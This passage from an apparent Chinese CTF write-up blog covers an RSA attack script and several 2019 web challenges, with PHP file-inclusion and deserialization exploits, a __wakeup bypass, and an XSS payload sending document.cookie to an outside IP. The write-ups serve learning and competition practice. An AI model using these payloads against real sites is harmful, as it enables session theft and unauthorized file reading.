class="string">"0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329893f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac5dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb11964970659cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356854eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1"</span></span><br><span class="line">c1=<span class="string">"0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c72160675d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d"</span></span><br><span class="line">c2=<span class="string">"0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7942214dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c38031d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fcbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670946356b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6"</span></span><br><span class="line">e1=int(e1,<span class="number">16</span>)/<span class="number">3</span></span><br><span class="line">e2=int(e2,<span class="number">16</span>)/<span class="number">3</span></span><br><span class="line">n=int(n,<span class="number">16</span>)</span><br><span class="line">c1=int(c1,<span class="number">16</span>)</span><br><span class="line">c2=int(c2,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># print gmpy2.gcd(e1,e2)</span></span><br><span class="line">ans=same_attack(e1,e2,c1,c2,n)</span><br><span class="line"><span class="comment"># print ans </span></span><br><span class="line">small_attack(ans,n,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>加上“hgame”即可得到flag：</p><p><img src="https://s2.ax1x.com/2019/03/03/kLDs9s.png" alt="kLDs9s.png"></p><h1 id="2019西湖论剑初赛复现"><a href="#2019西湖论剑初赛复现" class="headerlink" title="2019西湖论剑初赛复现"></a>2019西湖论剑初赛复现</h1><h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web"></a>Web</h2><h3 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h3><p>打开网页就发现了思路，<code>include $_GET(&#39;file&#39;)</code>，文件包含？？？<del>按理说安恒的题不应该这么明显看出来思路，肯定是出现了点问题…</del></p><p><img src="https://s2.ax1x.com/2019/04/11/AH8G1P.png" alt="AH8G1P.png"></p><p>尝试使用php封装的协议读取一下<code>index.php</code>；成功……<del>WTF????</del></p><p><img src="https://s2.ax1x.com/2019/04/11/AHGHGn.png" alt="AHGHGn.png">base64一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> (!$a) &#123;</span><br><span class="line">$a = <span class="string">'./templates/index.html'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--hint: ZGlyLnBocA== --&gt;</span><br></pre></td></tr></table></figure><p>发现确实是文件包含没错了，要求GET的变量不能包含flag字符，hint解密为dir.php；那就直接读取dir.php；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure><p>GET一个dir参数，打印出目录列表，那就直接读根目录即可；发现flag信息：</p><p><img src="https://s2.ax1x.com/2019/04/11/AHtjqf.png" alt="AHtjqf.png"></p><p>再返回首页继续用封装协议读文件即可：</p><p><img src="https://s2.ax1x.com/2019/04/11/AHUQAS.png" alt="AHUQAS.png"></p><p><img src="https://s2.ax1x.com/2019/04/11/AHUBh4.png" alt="AHUBh4.png"></p><p>不过试了一下直接<code>?file=/ffffflag_1s_Her4</code>也是可行的，应该是判断写的有问题…非预期解…</p><h3 id="猜猜flag是什么"><a href="#猜猜flag是什么" class="headerlink" title="猜猜flag是什么"></a>猜猜flag是什么</h3><p>没什么思路，直接扫后台，扫出.DS_store，应该对应的是MacOS的.DS_Store 文件泄漏</p><p><img src="https://s2.ax1x.com/2019/04/11/AHBkQJ.png" alt="AHBkQJ.png"></p><p>用exp脚本工具将目录下的东西下载下来</p><p><img src="https://s2.ax1x.com/2019/04/11/AHDZcQ.png" alt="AHDZcQ.png"></p><p>打开并没有发现什么有用的东西，都是一些套路…扫描<code>http://61.164.47.198:10002/e10adc3949ba59abbe56e057f20f883e</code></p><p>时发现.git泄露：</p><p><img src="https://s2.ax1x.com/2019/04/12/AbnCL9.png" alt="AbnCL9.png"></p><p>使用githack恢复源码：</p><p><img src="https://s2.ax1x.com/2019/04/11/AHrdMQ.png" alt="AHrdMQ.png"></p><p>发现压缩包是经过加密的，发现不仅给了压缩包，还给了一张图片，联想到zip明文攻击，攻击后得到hint：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code is 9faedd5999937171912159d28b219d86</span><br><span class="line">well ok ur good...By the way, flag saved in flag/seed.txt</span><br></pre></td></tr></table></figure><p>访问<code>http://61.164.47.198:10002/?code=9faedd5999937171912159d28b219d86</code>得到伪随机数<strong>500853255</strong></p><p>使用c语言脚本工具php_mt_seed在kali下爆破得到3个seed：</p><p><img src="https://s2.ax1x.com/2019/04/12/Abn1ot.png" alt="Abn1ot.png"></p><p>第一个就是正确的seed：</p><p><img src="https://s2.ax1x.com/2019/04/12/AbnNQg.png" alt="AbnNQg.png"></p><p>参考链接:<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p><h3 id="breakout"><a href="#breakout" class="headerlink" title="breakout"></a>breakout</h3><p>随手输入登录进去，发现第一个页面是一个留言功能，容易联想到XSS：</p><p><img src="https://s2.ax1x.com/2019/04/12/AqeXQg.png" alt="AqeXQg.png"></p><p>第二个页面，发现bug后，将页面的URL提交给管理员，管理员会携带cookie查看：</p><p><img src="https://s2.ax1x.com/2019/04/12/AqmAlF.png" alt="AqmAlF.png"></p><p>第三个页面：</p><p><img src="https://s2.ax1x.com/2019/04/12/Aqmem9.png" alt="Aqmem9.png"></p><p>看到第三个界面联想到命令执行，测试一下发现需要管理员身份，</p><p><img src="https://s2.ax1x.com/2019/04/12/AqmNTI.png" alt="AqmNTI.png"></p><p>这样的话，思路就出来了，大概就是用存储型xss，将存在xss的url发送给管理员形成xss盗取cookie，随后伪造管理员身份进行登录，命令执行；</p><h4 id="构造XSS"><a href="#构造XSS" class="headerlink" title="构造XSS"></a>构造XSS</h4><p>测试一下找到输出点：</p><p><img src="https://s2.ax1x.com/2019/04/12/Aqn2Ke.png" alt="Aqn2Ke.png"></p><p>fuzz一下，发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(233);&lt;/script&gt;</span><br><span class="line">&lt;:)&gt;alert(233);</span><br></pre></td></tr></table></figure><p>基本的字符script都被替换掉了，测试一下<code>&lt;li&gt;2333&lt;/li&gt;</code>发现还是可用的</p><p><img src="https://s2.ax1x.com/2019/04/12/Aqulse.png" alt="Aqulse.png"></p><p>所以我们可以采取闭合<code>&lt;li&gt;</code>标签的方法来构造XSS，尝试unicode编码绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/li&gt;&lt;iframe src=&quot;java&amp;#115;cript:window.location.href=&apos;http://165.227.63.123:2335/?a=&apos;+document.cookie&quot;&gt;&lt;/iframe&gt;&lt;li&gt;</span><br></pre></td></tr></table></figure><p>不过一直没有打到cookie，在此记录一下思路……</p><h2 id="Crypto-3"><a href="#Crypto-3" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="哈夫曼之谜"><a href="#哈夫曼之谜" class="headerlink" title="哈夫曼之谜"></a>哈夫曼之谜</h3><p>手动解题：</p><p>d和5的编码不确定，有两种可能性，<del>手动复习哈夫曼树</del></p><p><img src="https://s2.ax1x.com/2019/04/12/AbvRxK.jpg" alt="AbvRxK.jpg"></p><h1 id="2019信息安全国赛部分WP"><a href="#2019信息安全国赛部分WP" class="headerlink" title="2019信息安全国赛部分WP"></a>2019信息安全国赛部分WP</h1><h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web"></a>Web</h2><h3 id="justsoso"><a href="#justsoso" class="headerlink" title="justsoso"></a>justsoso</h3><p>这题一开始查看源代码：</p><p><img src="https://s2.ax1x.com/2019/04/20/EPmJjH.png" alt="EPmJjH.png"></p><p>提示读文件，想到文件包含，直接用php://协议读文件</p><p>得到index.php和hint.php</p><p><strong>index.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>hint.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显是反序列化漏洞，先看index.php，对$file参数的限制注定读取不了flag.php，所以我们包含hint.php来构造反序列化，完成读文件的操作；</p><h4 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h4><p>但是要反序列化必须要先绕过正则判断<code>preg_match(&quot;/flag/&quot;,$value)</code>，一开始天真地以为正则可以直接绕过，所以浪费了很多时间，仔细审计代码，发现是利用parse_url函数进行绕过的一个漏洞：</p><p><strong>本地测试：</strong></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">var_dump($url);</span><br><span class="line">parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line"><span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1.不做任何绕过：</p><p><img src="https://s2.ax1x.com/2019/04/20/EPMLQO.png" alt="EPMLQO.png"></p><p>2.在ip后面的路径加上个<code>//</code>，parse_url()会把<code>//</code>认为是相对路径；</p><p><img src="https://s2.ax1x.com/2019/04/20/EPM7Jx.png" alt="EPM7Jx.png"></p><p>3.在ip后面加上<code>///</code>，parse_url会返回false</p><blockquote><p>Note: parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///…）。其它任何协议都不能这样。</p></blockquote><p><img src="https://s2.ax1x.com/2019/04/20/EPQpFI.png" alt="EPQpFI.png"></p><p>这里加上<code>//</code>起不到任何作用，因为query参数没有任何变化，需要构造<code>///</code>，<code>preg_match(&quot;/flag/&quot;,$value)</code></p><p>里的$value即为空值，肯定是可以绕过正则匹配的；</p><h4 id="bypass2"><a href="#bypass2" class="headerlink" title="bypass2"></a>bypass2</h4><p>到此为止已经可以成功反序列化了，所以需要构造序列化字符串；<del>联想到pop链的构造，但貌似不是，噗哈哈</del></p><p><strong>分析：</strong></p><p>1.有两个不同的类，需要调用的关键方法是Flag类中的getFlag()方法，但是在进行反序列化的时候是不会自动调用的；</p><p>2.Handle类中的__destruct()方法是魔术方法，可以调用Flag类中的getFlag()方法，此时联想到将$handle赋值为Flag类的对象，此时就可以直接从Handle类里直接调用Flag类中的方法；</p><p>3.<code>__wakeup()</code>将在反序列化之后立即被调用，这个<code>__wakeup()</code>函数的作用就是将对象中的参数全部赋空，所以因此需要绕过__wakeup()；</p><p><strong>测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $gardenia1;</span><br><span class="line"><span class="keyword">public</span> $gardenia2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$sky=<span class="keyword">new</span> a();</span><br><span class="line">$sky-&gt;gardenia1=<span class="string">'haha'</span>;</span><br><span class="line">$sky-&gt;gardenia2=<span class="string">'kk'</span>;</span><br><span class="line">var_dump($sky);</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars($sky) <span class="keyword">as</span> $k =&gt; $v) </span><br><span class="line">&#123;</span><br><span class="line">    $sky-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($sky);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><img src="https://s2.ax1x.com/2019/04/20/EP1zTJ.png" alt="EP1zTJ.png"></p><p><strong>bypass技巧：</strong></p><blockquote><p>当序列化字符串当中属性个数值大于实际的属性个数时,就会导致反序列化异常,从而跳过__wakeup函数；</p></blockquote><p>那此时只需要改变反序列化的属性个数即可；</p><h4 id="bypass3"><a href="#bypass3" class="headerlink" title="bypass3"></a>bypass3</h4><p>绕过了上述两个点以后，看getFlag()函数，此时需要<code>$this-&gt;token === $this-&gt;token_flag</code>但是这两个随机值的散列值是很难做到强相等的，所以这就想到一叶飘零学长在安恒1月赛的骚操作，直接用<strong>引用</strong>的方法，使得两个变量指向同一个地址即可(飘零大佬tql)</p><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$gardenia1=<span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line">$gardenia1-&gt;token=&amp;$gardenia1-&gt;token_flag;</span><br><span class="line">$gardenia2=<span class="keyword">new</span> Handle($gardenia1);</span><br><span class="line">$res=urlencode(serialize($gardenia2));</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改参数个数绕过__wakeup()即可得到flag；</p><p><img src="https://s2.ax1x.com/2019/04/20/EPml4K.png" alt="EPml4K.png"></p><p><strong>参考链接：</strong><a href="http://www.am0s.com/functions/406.html，http://lawlietweb.com/2018/10/26/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%BB%95%E8%BF%87_wakeup()%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">http://www.am0s.com/functions/406.html，http://lawlietweb.com/2018/10/26/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%BB%95%E8%BF%87_wakeup()%E5%87%BD%E6%95%B0/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h1&gt;&lt;p&gt;本文为大学的一些参加过的CTF比赛的wp集合，一篇篇太零散，让我产生了我自己写博客好像仅仅只写了wp的错觉，所以就将wp全部放到了一起，以后还是多写点技术总结性的文章…
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>密码学学习笔记</title>
    <link href="https://gardenia30.top/2019/01/15/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/01/15/密码学笔记/</id>
    <published>2019-01-15T11:11:51.000Z</published>
    <updated>2019-11-10T12:23:13.841Z</updated>
    
